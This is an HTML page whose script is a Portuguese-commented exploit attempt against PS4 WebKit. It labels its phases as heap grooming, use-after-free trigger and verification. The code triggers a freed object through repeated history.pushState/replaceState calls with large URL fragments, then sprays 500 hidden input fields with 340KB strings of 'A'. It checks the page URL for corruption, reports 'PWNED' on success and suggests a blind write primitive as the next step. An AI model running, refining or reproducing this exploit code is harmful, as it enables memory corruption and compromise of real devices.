<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - DOM Input Spray</title>
<style>
    body { background-color: #200; color: #ff5555; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #f55; background: #500; color: #fff;
        text-transform: uppercase;
    }
    #log { border: 1px solid #700; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
    .success { color: #fff; background-color: #f00; padding: 5px; font-weight: bold;}
</style>
</head>
<body>
<h2>PS4 WebKit - DOM Input Reclaim</h2>
<div id="status">Estratégia: input.value Spray (340KB)</div>

<button onclick="runDOMExploit()">INICIAR ATAQUE DOM</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m, type="") { 
    const d = document.createElement("div");
    if(type) d.className = type;
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var inputs = [];
var sprayData = [];

// Gera a string de ataque "AAAA..." uma única vez
function preparePayload(len) {
    let arr = new Array(len);
    for(let i=0; i<len; i++) arr[i] = "A";
    return arr.join("");
}

async function runDOMExploit() {
    logEl.innerHTML = "";
    inputs = [];
    statusEl.innerText = "Carregando armas...";

    // ALVO: 340.356 bytes
    // Variação de tamanho para garantir encaixe
    const TARGET = 340356;
    
    log(`1. Gerando Payloads DOM (${TARGET} bytes)...`);
    
    let payloads = [];
    for(let delta = -64; delta <= 64; delta += 4) {
        payloads.push(preparePayload(TARGET + delta));
    }

    // === FASE 1: GROOMING (DOM) ===
    log("2. Criando campo minado de Inputs...");
    
    // Cria 500 inputs invisíveis
    const container = document.createElement("div");
    container.style.display = "none";
    document.body.appendChild(container);

    for(let i=0; i<500; i++) {
        let inp = document.createElement("input");
        inp.type = "text";
        container.appendChild(inp);
        inputs.push(inp);
    }
    
    // === FASE 2: TRIGGER UAF ===
    log("3. Disparando UAF...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        // MOMENTO CRÍTICO
        if (i === 47) {
            log(">>> ATAQUE DOM IMEDIATO <<<");
            
            // 1. Libera memória
            setTimeout(() => history.back(), 0);
            
            // 2. Preenche os Inputs com as strings gigantes
            // Isso força alocações massivas no Heap da DOM
            for(let k=0; k < inputs.length; k++) {
                // Usa payloads variados para "varrer" os tamanhos
                let p = payloads[k % payloads.length];
                inputs[k].value = p;
            }
            
            // 3. Force Layout (Tenta forçar o navegador a renderizar e limpar caches)
            let dummy = document.body.offsetHeight;
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(200);

    // === FASE 3: VERIFICAÇÃO ===
    checkResult();
}

function checkResult() {
    statusEl.innerText = "Verificando danos...";
    let url = document.URL;
    let changed = false;
    let sample = "";
    
    // Procura por 'A'
    for(let i=1000; i<5000; i++) {
        if(url.charCodeAt(i) === 0x41) { 
            changed = true;
            sample = "Encontrado 'A' no offset " + i;
            break;
        }
    }

    if(changed) {
        log("!!! SUCESSO !!!", "success");
        log("DOM Input Spray funcionou!");
        log(sample);
        statusEl.innerText = "PWNED: DOM";
    } else {
        log("Falha: Ainda vendo 'V'.");
        log("Diagnóstico: O cache está segurando o objeto com força total.");
        log("Próximo passo sugerido: Tentar corromper o Length (Write Primitive às cegas).");
    }
}
</script>
</body>
</html>
